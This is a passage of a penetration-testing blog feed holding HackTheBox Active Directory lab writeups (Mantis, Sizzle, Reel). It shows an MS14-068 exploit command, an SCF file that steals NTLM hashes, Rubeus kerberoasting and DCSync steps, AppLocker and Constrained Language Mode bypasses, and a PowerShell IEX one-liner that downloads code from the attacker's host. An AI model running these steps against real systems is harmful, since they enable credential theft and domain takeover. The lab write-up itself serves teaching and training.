<p><code class="language-plaintext highlighter-rouge">james</code> is a valid AD user, we just need to get his <strong>SID</strong>.</p>

<p><em>With a handy</em> <strong>Impacket</strong> <em>script called</em> <code class="language-plaintext highlighter-rouge">lookupsid.py</code>, we can easily get that.</p>

<p><img src="/assets/Mantis/james-sid-calculation.jpg" alt="james-sid-calculation" /></p>

<p><em>Because like the picture above,</em> a user’s SID is formed of <code class="language-plaintext highlighter-rouge">&lt;DOMAIN_SID&gt;-&lt;USER_RID&gt;</code></p>

<p>We’re going to run the exploit with the needed parameters.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2.7 ./ms14-068.py <span class="nt">-u</span> james@htb.local <span class="nt">-s</span> S-1-5-21-4220043660-4019079961-2895681657-1103 <span class="nt">-d</span> mantis.htb.local <span class="nt">-p</span> <span class="s1">'J@m3s_P@ssW0rd!'</span>
</code></pre></div></div>

<p><img src="/assets/Mantis/got-forged-ticket.jpg" alt="got-forged-ticket" /></p>

<p>Looks like a success! :D</p>

<p>we’re going to export this ticket to our shell environment’s <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code> variable and use <code class="language-plaintext highlighter-rouge">psexec.py</code> to own this DC :D</p>

<p><img src="/assets/Mantis/pykek-for-the-win.jpg" alt="pykek-for-the-win" /></p>

<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="https://omnisl4sh.github.io/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/02/Sizzle</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>Windows Domain Controller</strong> machine. We find an <strong>SMB share</strong> containing a <em>writable</em> folder called <code class="language-plaintext highlighter-rouge">Public</code>. We place an <code class="language-plaintext highlighter-rouge">SCF</code> file there that <em>directs the visiting user’s computer</em> to our listening <code class="language-plaintext highlighter-rouge">responder</code> where we capture his <code class="language-plaintext highlighter-rouge">NTLMv2</code> hash.</li>
  <li><em>After cracking it,</em> we get the password for the <code class="language-plaintext highlighter-rouge">amanda</code> user which we use to enumerate the domain using <code class="language-plaintext highlighter-rouge">BloodHound</code>.</li>
  <li><em>Noticing that our user has</em> <strong>PowerShell Remoting</strong> <em>capabilities,</em> we try to gain access but are faced with a <em>strange authentication error</em>.</li>
  <li><em>Upon inspecting the functionality of the</em> <code class="language-plaintext highlighter-rouge">Evil-Winrm</code> <em>tool,</em> we find that we can use a <em>certificate</em> for logging in.</li>
  <li>We create a <strong>Certificate Signing Request</strong> using <code class="language-plaintext highlighter-rouge">openssl</code> and get it signed from the <strong>ADCS Web Interface</strong> found on the domain controller.</li>
  <li><em>Using</em> <code class="language-plaintext highlighter-rouge">evil-winrm</code>‘<em>s ability to authenticate using SSL certificates,</em> we successfully achieve code execution.</li>
  <li>Looking back at the output of <code class="language-plaintext highlighter-rouge">BloodHound</code> showed a <em>kerberoastable</em> user called <code class="language-plaintext highlighter-rouge">mrlky</code> that has dangerous rights abusable for a <code class="language-plaintext highlighter-rouge">DCSync</code> attack.</li>
  <li>We decide to use <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> to do the job but can’t execute it due to <strong>Applocker</strong> restrictions.</li>
  <li>We bypass by moving it to the Windows <code class="language-plaintext highlighter-rouge">temp</code> folder and are faced with another error requiring us to authenticate to the network.</li>
  <li>We add <code class="language-plaintext highlighter-rouge">amanda</code>’s credentials as flags to the <code class="language-plaintext highlighter-rouge">Rubeus</code> tool and manage to kerberoast <code class="language-plaintext highlighter-rouge">mrkly</code>.</li>
  <li>We crack his <code class="language-plaintext highlighter-rouge">TGS</code> hash and are able to get the password. We then proceed to <code class="language-plaintext highlighter-rouge">DCSync</code> and obtain the <code class="language-plaintext highlighter-rouge">NTLM hash</code> for the <code class="language-plaintext highlighter-rouge">administrator</code> account and <code class="language-plaintext highlighter-rouge">PTH</code> to gain complete access.</li>
  <li>Bonus: Bypassing <strong>PowerShell Constrained Language Mode</strong>, dodging <strong>Applocker</strong>, <strong>authenticating</strong> to the network and <strong>Kerberoasting</strong> all in a <strong>one-liner</strong> and <em>without touching disk</em>.</li>
  <li>Joke Section: Pwning the box with <strong>ZeroLogon</strong> XD</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p>The nmap output gives some good information:</p>
<ul>
  <li><strong>Machine Name:</strong> Sizzle</li>
  <li><strong>Domain Name:</strong> HTB.local</li>
  <li><strong>FTP</strong> with <em>anonymous</em> login allowed</li>
  <li><strong>IIS</strong> 10.0 on port 80 which indicates server 2016+ or windows 10</li>
  <li><strong>SMB</strong> on port 445</li>
  <li><strong>LDAP</strong> and <strong>GC</strong> on ports 389 and 3268</li>
  <li><strong>WinRM</strong> on 5985/5986 which is always nice to have</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-04-30T19:55:42
|_  start_date: 2022-04-30T19:49:45
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
</code></pre></div></div>

<h3 id="anonymous-ftp">Anonymous FTP</h3>
<p>No files were there, and we’re not granted <code class="language-plaintext highlighter-rouge">write</code> access either. So we move on.</p>

<p><img src="/assets/Sizzle/Anon-FTP-no-write.jpg" alt="Anon-FTP-no-write" /></p>

<h3 id="httphttps">HTTP/HTTPs</h3>
<p>The home page just shows a <code class="language-plaintext highlighter-rouge">GIF</code> of bacon sizzling…</p>

<p><img src="/assets/Sizzle/http-homepage.jpg" alt="http-homepage" /></p>

<p>Spidering with <code class="language-plaintext highlighter-rouge">gobuster</code> shows an interesting directory <code class="language-plaintext highlighter-rouge">/certsrv</code> which indicates that the <strong>ADCS role</strong> is installed on this server. We note this down.</p>

<p><img src="/assets/Sizzle/gobuser-output.jpg" alt="gobuser-output" /></p>

<p>the <strong>HTTPS</strong> website is similar in structure. so we move along.</p>

<h3 id="ldap">LDAP</h3>
<p>The output of <code class="language-plaintext highlighter-rouge">ldapsearch</code> didn’t show much information.</p>

<p><img src="/assets/Sizzle/ldapsearch-output.jpg" alt="ldapsearch-output" /></p>

<p>(<em>I grepped out some unnecessary lines from the output to make it smaller.</em>)</p>

<h3 id="smb">SMB</h3>
<p>Enumerating SMB with <code class="language-plaintext highlighter-rouge">crackmapexec</code> reveals that we have <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">Department Shares</code> folder.</p>

<p><img src="/assets/Sizzle/cme-smb-share-enum.jpg" alt="cme-smb-share-enum" /></p>

<p><em>After mounting it,</em> we notice a couple of folders:</p>

<p><img src="/assets/Sizzle/dpt-shares-folders.jpg" alt="dpt-shares-folders" /></p>

<p>the <code class="language-plaintext highlighter-rouge">Users</code> folder contained some usernames which we save in a list for later use:</p>

<p><img src="/assets/Sizzle/userlist-from-smb.jpg" alt="userlist-from-smb" /></p>

<p>We find some files in the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folder but they dont have any content:</p>

<p><img src="/assets/Sizzle/zz-archive-files.jpg" alt="zz-archive-files" /></p>

<p>we loop over the files using the <code class="language-plaintext highlighter-rouge">file</code> command and <code class="language-plaintext highlighter-rouge">grep</code> out any empty hex line with <code class="language-plaintext highlighter-rouge">xxd</code> to find nothing there as well.</p>

<p><img src="/assets/Sizzle/checking_zz_archive.jpg" alt="checking_zz_archive" /></p>

<p><em>Since we were nearing a dead end with our enumeration,</em> we’re going to use a simple <code class="language-plaintext highlighter-rouge">bash</code> script to check for <code class="language-plaintext highlighter-rouge">write</code> access in the SMB share.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nv">list</span><span class="o">=</span><span class="si">$(</span>find /mnt <span class="nt">-type</span> d<span class="si">)</span>
<span class="k">for </span>d <span class="k">in</span> <span class="nv">$list</span>
<span class="k">do
        </span><span class="nb">touch</span> <span class="nv">$d</span>/just-a-test-dir 2&gt;/dev/null
        <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
        <span class="k">then
                </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[32m[+] </span><span class="nv">$d</span><span class="s2"> is writable</span><span class="se">\e</span><span class="s2">[0m"</span>
                <span class="nb">rm</span> <span class="nv">$d</span>/just-a-test-dir
        <span class="k">else
                </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[31m[-] </span><span class="nv">$d</span><span class="s2"> is not writable</span><span class="se">\e</span><span class="s2">[0m"</span>
        <span class="k">fi
done</span>
</code></pre></div></div>

<ol>
  <li>it does a <code class="language-plaintext highlighter-rouge">find</code> on the mount point with the <code class="language-plaintext highlighter-rouge">-type d</code> flag to get <em>only directories</em>.</li>
  <li>then attempts to create a file in each one using <code class="language-plaintext highlighter-rouge">touch</code></li>
  <li>It prints out if the folder is writable or not</li>
  <li>then clears the test file if the folder is writable.</li>
</ol>

<p><img src="/assets/Sizzle/check-write-script-results.jpg" alt="check-write-script-results" /></p>

<p>The results show that we have <code class="language-plaintext highlighter-rouge">write</code> access in both the <code class="language-plaintext highlighter-rouge">Public</code> and <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders.</p>

<p>Having this access would allow us to <em>plant a malicious type of file</em> that would enable us to <em>steal</em> <strong>NTLMv2 hashes</strong> from users who access these locations.</p>

<h3 id="scf-file-attacks-for-hash-theft">SCF File Attacks for Hash Theft</h3>
<p>SCF (Shell Command Files) are files that can perform actions in <strong>Windows Explorer</strong>. One functionality can be <em>abused</em> to have the <em>share-visiting</em> user <em>directed</em> to our kali machine.</p>

<p>This can be done using a file with the below content:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
Command=2
IconFile=\\10.10.16.7\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
</code></pre></div></div>

<p><em>Essentially,</em> this tells <strong>File Explorer</strong> to <em>fetch</em> the icon for the <code class="language-plaintext highlighter-rouge">.scf</code> file from a network share (<em>our kali box in this case</em>).</p>

<p>We’re going to fire up <code class="language-plaintext highlighter-rouge">responder</code> making sure the <code class="language-plaintext highlighter-rouge">Responder.conf</code> file has the <code class="language-plaintext highlighter-rouge">SMB</code> server set to <code class="language-plaintext highlighter-rouge">ON</code>.</p>

<p>And then copy the <code class="language-plaintext highlighter-rouge">.scf</code> file to <code class="language-plaintext highlighter-rouge">\\10.10.10.103\Department Shares\Users\Public</code> as well as the <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> folders to make sure any visitor gives us his/her hash.</p>

<p><img src="/assets/Sizzle/amanda-hash-captured.jpg" alt="amanda-hash-captured" /></p>

<p>We manage to get a response from the <code class="language-plaintext highlighter-rouge">amanda</code> user right away :D</p>

<p>We then get to cracking with <code class="language-plaintext highlighter-rouge">john</code></p>

<p><img src="/assets/Sizzle/amanda-hash-cracked.jpg" alt="amanda-hash-cracked" /></p>

<p>the password turns out to be <code class="language-plaintext highlighter-rouge">Ashare1972</code></p>

<h3 id="the-winrm-situation">The WinRM situation</h3>
<p>We first validate the creds for <code class="language-plaintext highlighter-rouge">amanda</code> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> via SMB and they work.</p>

<p>So we try WinRM after but end up with a weird error message:</p>

<p><img src="/assets/Sizzle/cme-smb-yes-winrm-no.jpg" alt="cme-smb-yes-winrm-no" /></p>

<p>at this moment, I wasn’t quite sure what to do. So I moved on to try other things.</p>

<h3 id="domain-enumeration-with-bloodhoundpy">Domain Enumeration With BloodHound.py</h3>
<p><em>Since I didn’t have code execution,</em> I turned to the <strong>Python</strong> version of <code class="language-plaintext highlighter-rouge">BloodHound</code> to do enumeration with all collection methods:</p>

<p><img src="/assets/Sizzle/bloodhound-py.jpg" alt="bloodhound-py" /></p>

<p><em>Viewing the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user,</em> I saw she did have <strong>PowerShell Remoting</strong> capability when I ran the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principles</code> query.</p>

<p><img src="/assets/Sizzle/amanda-can-ps-remote.jpg" alt="amanda-can-ps-remote" /></p>

<h3 id="getting-winrm-to-work">Getting WinRM to work</h3>
<p><em>Since we have access to the</em> <code class="language-plaintext highlighter-rouge">amanda</code> <em>user’s credentials,</em> we can <em>request</em> a <strong>User Certificate</strong> from <strong>AD Certificate Services.</strong></p>

<p>This can be done after authenticating to <code class="language-plaintext highlighter-rouge">http://10.10.10.103/certsrv</code> and submitting a <strong>Certificate Signing Request</strong> (<strong>CSR</strong> for short).</p>

<p><em>Before visiting the</em> <strong>ADCS</strong> <em>page,</em> we would need to get a <strong>key</strong> and a <strong>CSR</strong>. This can be done using <code class="language-plaintext highlighter-rouge">openssl</code>.</p>

<p>The command should be as below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-keyout</span> amanda.key <span class="nt">-out</span> amanda.csr
</code></pre></div></div>

<p><img src="/assets/Sizzle/gen-key-gen-csr.jpg" alt="gen-key-gen-csr" /></p>

<p>Note the contents of the <code class="language-plaintext highlighter-rouge">.csr</code> file:</p>

<p><img src="/assets/Sizzle/amanda-csr.jpg" alt="amanda-csr" /></p>

<p>We now visit the page:</p>

<p><img src="/assets/Sizzle/cert-srv-1.jpg" alt="cert-srv-1" /></p>

<p><img src="/assets/Sizzle/cert-srv-2.jpg" alt="cert-srv-2" /></p>

<p>we then paste what we copied from <code class="language-plaintext highlighter-rouge">amanda.csr</code></p>

<p><img src="/assets/Sizzle/cert-srv-3.jpg" alt="cert-srv-3" /></p>

<p>And we select the <strong>Base 64 encoded version</strong> and download it.</p>

<p><img src="/assets/Sizzle/cert-srv-4.jpg" alt="cert-srv-4" /></p>

<p><em>Having done all this,</em> we just need to hook both the <code class="language-plaintext highlighter-rouge">.key</code> file and the <code class="language-plaintext highlighter-rouge">.cer</code> we got from <strong>ADCS</strong> to <code class="language-plaintext highlighter-rouge">evil-winrm</code> while using the <code class="language-plaintext highlighter-rouge">-S</code> flag for SSL.</p>

<p>We know so from checking the help:</p>

<p><img src="/assets/Sizzle/evil-winrm-help.jpg" alt="evil-winrm-help" /></p>

<p>And it works like a charm :D</p>

<p><img src="/assets/Sizzle/winrm-success-amanda.jpg" alt="winrm-success-amanda" /></p>

<p>Note: the PEM pass phrase is the one you were asked to enter when generating the private key and CSR with <code class="language-plaintext highlighter-rouge">openssl</code></p>

<h3 id="back-to-bloodhound-graphs-kerberoastable-users">Back to <code class="language-plaintext highlighter-rouge">BloodHound</code> graphs: Kerberoastable Users</h3>
<p>Inspecting the query <code class="language-plaintext highlighter-rouge">List all Kerberoastable Accounts</code> shows us that a user called <code class="language-plaintext highlighter-rouge">mrlky</code> is vulnerable.</p>

<p><img src="/assets/Sizzle/mrlky-kerberoastable.jpg" alt="mrlky-kerberoastable" /></p>

<p>That user is very special since he has the 2 required rights to perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">GetChanges</code></li>
  <li><code class="language-plaintext highlighter-rouge">GetChangesAll</code></li>
</ol>

<p><img src="/assets/Sizzle/mrlky-can-dcsync.jpg" alt="mrlky-can-dcsync" /></p>

<p><em>Hence,</em> we need to kerberoast this guy and get his TGS hash :D</p>

<h3 id="roasting-with-rubeus-bypassing-applocker-and-performing-network-authentication">Roasting with Rubeus: Bypassing Applocker and Performing Network Authentication</h3>
<p><em>After copying</em> <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> <em>from our kali machine over to</em> <code class="language-plaintext highlighter-rouge">amanda</code>‘<em>s documents folder</em>, we find that we can’t execute due to <strong>Applocker.</strong></p>

<p><img src="/assets/Sizzle/rubeus-applocked.jpg" alt="rubeus-applocked" /></p>

<p>Moving it to <code class="language-plaintext highlighter-rouge">c:\windows\temp</code> directory works as a bypass. But we get another error:</p>

<p><img src="/assets/Sizzle/rubeus-no-net-logon.jpg" alt="rubeus-no-net-logon" /></p>

<p>This is because we logged in using a different way: user certificate.</p>

<p><em>In order to carry out this attack,</em> we would need to authenticate to the network.</p>

<p>This can be done using the <code class="language-plaintext highlighter-rouge">/creduser</code>, <code class="language-plaintext highlighter-rouge">/credpassword</code> and <code class="language-plaintext highlighter-rouge">/domain</code> switches in <code class="language-plaintext highlighter-rouge">Rubeus.exe</code>.</p>

<p>The command is: <code class="language-plaintext highlighter-rouge">.\rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /domain:htb.local</code></p>

<p><img src="/assets/Sizzle/mrlky-kerberoasted.jpg" alt="mrlky-kerberoasted" /></p>

<p>We’re good! :D</p>

<p>Now we crack the hash for <code class="language-plaintext highlighter-rouge">mrkly</code> again with <code class="language-plaintext highlighter-rouge">john</code>:</p>

<p><img src="/assets/Sizzle/mrlky-cracked.jpg" alt="mrlky-cracked" /></p>

<h3 id="dcsync">DCSync</h3>
<p><em>Having the password for</em> <code class="language-plaintext highlighter-rouge">mrkly</code>: <code class="language-plaintext highlighter-rouge">Football#7</code>, we’re going to use <code class="language-plaintext highlighter-rouge">Impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> python script to do a <code class="language-plaintext highlighter-rouge">DCSync</code> attack:</p>

<p><img src="/assets/Sizzle/dcsynced.jpg" alt="dcsynced" /></p>

<p>and follow up with <code class="language-plaintext highlighter-rouge">psexec.py</code> for a quick <strong>Pass-The-Hash</strong> attack to get code execution as <code class="language-plaintext highlighter-rouge">NT Authority\System</code>:</p>

<p><img src="/assets/Sizzle/got-system.jpg" alt="got-system" /></p>

<h3 id="bonus-powershell-constrained-language-mode-bypassing-it-along-with-applocker-and-kerberoasting-without-touching-disk-all-in-a-powershell-one-liner-d">Bonus: PowerShell Constrained Language Mode, Bypassing it along with Applocker and Kerberoasting without touching disk. All in a PowerShell one-liner :D</h3>
<p>After I initially got the WinRM shell, It kept asking for my PEM pass phrase after each command.</p>

<p>I wanted to get a <code class="language-plaintext highlighter-rouge">nishang</code> shell but couldn’t do the <code class="language-plaintext highlighter-rouge">IEX</code> command (<code class="language-plaintext highlighter-rouge">Invoke-Expression</code>). This was because of <strong>PowerShell’s Contrained Language Mode</strong>.</p>

<p><img src="/assets/Sizzle/constrained-language-mode.jpg" alt="constrained-language-mode" /></p>

<p><strong>Contrained Language Mode</strong> disables a few PowerShell commands that can be dangerous.</p>

<p><em>Fortunately,</em> it can be bypassed by <em>downgrading</em> to <strong>PowerShell</strong> version 2.</p>

<p>We’re going to be abusing the <code class="language-plaintext highlighter-rouge">Start-Process</code> command to start a <code class="language-plaintext highlighter-rouge">powershell.exe</code> with <code class="language-plaintext highlighter-rouge">-v 2</code> and the command <code class="language-plaintext highlighter-rouge">-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')</code> as arguments.</p>

<p>This is to:</p>
<ol>
  <li>Start a <strong>PowerShell</strong> version 2 process without locking the terminal.</li>
  <li>Import the <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast</code> code into memory.</li>
  <li>Execute the command <code class="language-plaintext highlighter-rouge">Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt</code>.</li>
  <li>Output the TGS hash of the <code class="language-plaintext highlighter-rouge">mrlky</code> user to our SMB share.</li>
</ol>

<p>we will use the <code class="language-plaintext highlighter-rouge">-Credential</code> parameter with <code class="language-plaintext highlighter-rouge">Start-Process</code> to create the Network Authentication needed for the attack to succeed.</p>

<p><em>That way,</em> we’ve hit multiple birds with one stone.</p>
<ol>
  <li>We never had to deal with <strong>Applocker</strong></li>
  <li>Dodged <strong>Contrained Language Mode</strong></li>
  <li>Created the needed <strong>Network Logon</strong></li>
  <li><strong>Kerberoasted</strong> <em>without ever touching the victim’s disk</em></li>
</ol>

<p><img src="/assets/Sizzle/bonus-kill.jpg" alt="bonus-kill" /></p>

<h3 id="joke-section-pwning-the-box-with-zerologon-xd">Joke Section: Pwning the box with <code class="language-plaintext highlighter-rouge">ZeroLogon</code> XD</h3>

<p>You could do all of the above.</p>

<p>OR…</p>

<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="https://omnisl4sh.github.io/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/30/Reel</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/30/Reel.html"><![CDATA[<p><img src="/assets/Reel/Reel.png" alt="Reel" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>windows machine</strong> with <code class="language-plaintext highlighter-rouge">Anonymous FTP</code> allowed. <em>Inspecting the contents</em> reveals a <strong>documents folder</strong> one of which tells us that <em>RTF documents are being reviewed and converted by someone</em>.</li>
  <li><em>Using this information,</em> we craft a <em>malicious document</em> using <strong>CVE-2017-0199</strong> and send it to a certain user called <code class="language-plaintext highlighter-rouge">nico</code> via the open <code class="language-plaintext highlighter-rouge">SMTP</code> port (<em>We find his username by checking the metadata of the documents on FTP</em>).</li>
  <li><em>When the document is opened,</em> we get a shell back as <code class="language-plaintext highlighter-rouge">nico</code> and start enumerating the machine.</li>
  <li><em>With BloodHound,</em> we find that nico has a <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over another user <code class="language-plaintext highlighter-rouge">herman</code> who has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> over a certain group called <code class="language-plaintext highlighter-rouge">Backup_Admins</code>.</li>
  <li>We abuse the <code class="language-plaintext highlighter-rouge">WriteOwner</code> right to grant ourselves the right to reset <code class="language-plaintext highlighter-rouge">herman</code>’s password and abuse the <code class="language-plaintext highlighter-rouge">WriteDACL</code> to add him to the <code class="language-plaintext highlighter-rouge">Backup_Admins</code> group.</li>
  <li>We then find out that <code class="language-plaintext highlighter-rouge">Backup_Admins</code> have access to a certain folder called <code class="language-plaintext highlighter-rouge">Backup Scripts</code> on the <code class="language-plaintext highlighter-rouge">Administrator</code>’s desktop on the box.</li>
  <li><em>Within that folder,</em> we find a script that contains the password for the local administrator which works and we use it to login using the open <code class="language-plaintext highlighter-rouge">SSH</code> port.</li>
  <li>A <em>Similar path</em> exists with another user <code class="language-plaintext highlighter-rouge">tom</code> whom his credentials are present in a <code class="language-plaintext highlighter-rouge">creds.xml</code> file on <code class="language-plaintext highlighter-rouge">nico</code>’s desktop as a <code class="language-plaintext highlighter-rouge">secure string</code>.</li>
  <li>The clear-text credentials can be retrieved to gain access as <code class="language-plaintext highlighter-rouge">tom</code> using <code class="language-plaintext highlighter-rouge">SSH</code>. <code class="language-plaintext highlighter-rouge">tom</code> has <code class="language-plaintext highlighter-rouge">WriteOwner</code> on <code class="language-plaintext highlighter-rouge">claire</code> who has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> on <code class="language-plaintext highlighter-rouge">Backup_Admins</code>.</li>
  <li>Another path exists with abusing the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> held by <code class="language-plaintext highlighter-rouge">tom</code> since he’s a member of the <code class="language-plaintext highlighter-rouge">Print Operators</code> group.</li>
  <li>The box is also vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2018-8440</code> and <code class="language-plaintext highlighter-rouge">CVE-2019-1458</code> local privilege escalation exploits.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<p><em>Looking at the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>scan,</em> we find very few ports running:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION                                                                                      
21/tcp open  ftp     Microsoft ftpd                                                                               
| ftp-syst:                                                                                                       
|_  SYST: Windows_NT                                                                                              
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                            
|_05-29-18  12:19AM       &lt;DIR&gt;          documents                                                                
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)                                                                   
| ssh-hostkey:                                                                                                    
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)            
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)           
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)         
25/tcp open  smtp?                                                                                                
| fingerprint-strings:                                                                                            
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready                                                                                      
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready                                                                                      
|     sequence of commands                                                                                        
|     sequence of commands                                                                                        
|   Hello:                                                                                                        
|     220 Mail Service ready                                                                                      
